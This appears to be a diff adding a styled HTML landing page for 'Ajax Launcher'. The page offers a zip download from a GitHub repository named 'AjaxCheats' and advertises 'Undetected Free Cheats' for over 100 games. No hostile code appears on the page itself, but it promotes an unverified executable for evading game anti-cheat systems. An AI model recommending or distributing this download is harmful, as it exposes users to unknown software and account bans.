@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta name="google-site-verification" content="lh80GslV6b4AaUoebYpvyk9bQI_4KjOkNHeCt_JUwsM" />
+    <meta name="google-site-verification" content="qS-1-F6KIiURdwd1G50Cd2kHofKzSWyz-MkOBOg36XQ" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download Ajax Launcher</title>
+    <meta name="description" content="Download Ajax Launcher">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            color: #fff;
+            text-align: center;
+            font-family: 'Roboto', sans-serif; /* Применение шрифта Roboto */
+            background: linear-gradient(135deg, #ffffff, #cccccc, #0077cc); /* Бело-серо-синий градиент */
+            background-size: 400% 400%; /* Размер фона для анимации */
+            animation: gradient-animation 15s ease infinite; /* Анимация градиента */
+        }
+
+        @keyframes gradient-animation {
+            0% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        h1 {
+            margin-bottom: 20px;
+            font-size: 2.5em;
+            position: relative;
+            z-index: 1;
+        }
+
+        .download-button {
+            padding: 15px 30px;
+            font-size: 1.5em;
+            border: none;
+            border-radius: 5px;
+            background-color: #4CAF50; /* Непрозрачный цвет фона для кнопки */
+            color: white;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background-color 0.3s, box-shadow 0.3s;
+            position: relative;
+            z-index: 1;
+            box-shadow: 0 0 5px rgba(76, 175, 80, 0.8), 0 0 10px rgba(76, 175, 80, 0.8), 0 0 15px rgba(76, 175, 80, 0.8); /* Неоновая тень */
+        }
+
+        .download-button:hover {
+            background-color: #45a049; /* Непрозрачный цвет фона при наведении */
+            box-shadow: 0 0 10px rgba(69, 160, 73, 1), 0 0 20px rgba(69, 160, 73, 1), 0 0 30px rgba(69, 160, 73, 1); /* Увеличенная неоновая тень при наведении */
+        }
+
+        h2 {
+            margin-top: 20px;
+            font-size: 1.5em;
+            position: relative;
+            z-index: 1;
+        }
+
+        ul {
+            list-style-type: none; /* Убираем маркеры списка */
+            padding: 0; /* Убираем отступы */
+            margin-top: 10px; /* Отступ сверху */
+            font-size: 1.2em; /* Размер шрифта для списка */
+        }
+
+        li {
+            margin: 5px 0; /* Отступы между элементами списка */
+        }
+    </style>
+</head>
+<body>
+    <h1>Ajax Launcherr</h1>
+    <a href="https://github.com/driedmouse-sold/AjaxCheats/releases/download/v2.1ajax/AjaxLauncher.zip" class="download-button">Download</a>
+    <h2>Features:</h2>
+    <ul>
+        <li>Supported 100+ games</li>
+        <li>Undetected Free Cheats</li>
+        <li>Easy to use</li>
+    </ul>
+</body>
+</html>
